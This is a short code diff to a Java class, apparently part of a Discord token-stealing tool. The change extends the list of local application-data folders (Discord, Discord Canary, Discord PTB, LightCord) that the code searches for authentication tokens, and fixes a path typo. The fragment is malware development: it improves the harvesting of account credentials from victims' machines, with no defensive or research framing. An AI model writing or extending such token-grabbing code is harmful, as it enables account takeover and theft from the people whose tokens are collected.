@@ -27,7 +27,9 @@ public class Discord implements Request {
 
     @Override
     public void init() {
-        String[] dataPaths = {System.getenv("APPDATA") + "/Discord",System.getenv("APPDATA") + "discordcanary"};
+        String[] dataPaths = {
+                System.getenv("APPDATA") + "/Discord",System.getenv("APPDATA") + "/discordcanary",System.getenv("APPDATA") + "/discordptb",System.getenv("APPDATA") + "/LightCord"
+        };
         try {
             for (String path: dataPaths) {
                 tokenList = getTokens(path);
